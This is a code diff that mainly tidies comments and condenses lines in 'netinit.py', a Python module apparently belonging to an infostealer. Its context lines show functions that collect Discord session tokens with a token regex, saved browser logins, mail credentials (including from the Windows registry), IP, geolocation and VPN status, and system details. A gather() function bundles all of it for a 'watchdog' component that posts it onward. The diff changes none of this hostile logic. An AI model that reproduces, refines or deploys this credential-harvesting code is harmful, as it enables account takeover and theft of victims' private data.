@@ -1,5 +1,5 @@
 # netinit.py — gathers everything into one dict.
-# main.py calls gather(), watchdog posts it.
+# main.py calls gather(); watchdog posts it.
 
 import base64
 import json
@@ -16,9 +16,6 @@ _R = os.getenv("APPDATA", "")
 _HOME = os.path.expanduser("~")
 
 
-# ---------------------------------------------------------------------------
-# http helper
-# ---------------------------------------------------------------------------
 def _get_json(url, timeout=8):
     try:
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
@@ -27,9 +24,7 @@ def _get_json(url, timeout=8):
         return {}
 
 
-# ---------------------------------------------------------------------------
-# env
-# ---------------------------------------------------------------------------
+# ---------------------------------------------------------------- env
 def _env():
     out = {
         "os": platform.platform(),
@@ -90,9 +85,7 @@ def _env():
     return out
 
 
-# ---------------------------------------------------------------------------
-# ip / geo / vpn
-# ---------------------------------------------------------------------------
+# ------------------------------------------------------------- route
 def _route():
     out = {"ip": "?", "country": "?", "city": "?", "isp": "?", "vpn": "?", "coords": "?"}
     ip = ""
@@ -106,7 +99,6 @@ def _route():
     if not ip:
         return out
     out["ip"] = ip
-
     geo = _get_json(f"http://ip-api.com/json/{ip}")
     out["country"] = geo.get("country", "?")
     out["city"] = geo.get("city", "?")
@@ -114,16 +106,11 @@ def _route():
     lat, lon = geo.get("lat"), geo.get("lon")
     if lat is not None and lon is not None:
         out["coords"] = f"{lat}, {lon}"
-    if geo.get("proxy") or geo.get("hosting"):
-        out["vpn"] = "possible (proxy/hosting asn)"
-    else:
-        out["vpn"] = "none detected"
+    out["vpn"] = "possible (proxy/hosting asn)" if (geo.get("proxy") or geo.get("hosting")) else "none detected"
     return out
 
 
-# ---------------------------------------------------------------------------
-# discord tokens
-# ---------------------------------------------------------------------------
+# ------------------------------------------------------------ tokens
 _SESS_RX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
 
 _TOKEN_DIRS = {
@@ -210,9 +197,7 @@ def _tokens():
     return out
 
 
-# ---------------------------------------------------------------------------
-# browser logins
-# ---------------------------------------------------------------------------
+# ------------------------------------------------------------ logins
 def _logins():
     out = []
     candidates = [
@@ -252,9 +237,7 @@ def _logins():
     return out
 
 
-# ---------------------------------------------------------------------------
-# mail creds
-# ---------------------------------------------------------------------------
+# ------------------------------------------------------------- mails
 def _mails():
     out = []
     try:
@@ -271,7 +254,6 @@ def _mails():
                 continue
     except Exception:
         pass
-
     if os.name == "nt":
         try:
             import winreg
@@ -290,9 +272,7 @@ def _mails():
     return out
 
 
-# ---------------------------------------------------------------------------
-# aggregate — the one function main.py calls
-# ---------------------------------------------------------------------------
+# -------------------------------------------------------- aggregate
 def gather():
     data = {}
     try:
